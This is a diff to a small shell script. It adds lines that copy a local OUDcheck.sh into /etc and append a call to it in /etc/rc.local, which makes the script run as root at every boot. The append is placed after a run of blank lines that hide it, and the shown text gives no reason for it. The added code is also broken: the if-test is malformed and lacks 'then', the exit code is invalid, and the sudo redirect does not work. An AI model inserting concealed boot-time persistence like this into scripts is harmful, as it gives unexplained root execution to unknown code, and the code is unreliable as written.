@@ -1,5 +1,20 @@
 username=$(whoami);
+FILEOUDCHECK="$PWD"/OUDcheck.sh
+if [ ! -f "$FILEOUDCHECK"]
+echo "Critical file missing!"
+echo "exiting..."
+exit 404
+fi
 
+cp "$FILEOUDCHECK" /etc/
+
+
+
+
+
+
+
+sudo echo "sh /etc/OUDcheck.sh" >> /etc/rc.local
 FILE=/home/"$username"/server/true.txt
 if [ ! -f "$FILE" ]; then
     echo "File not found!"
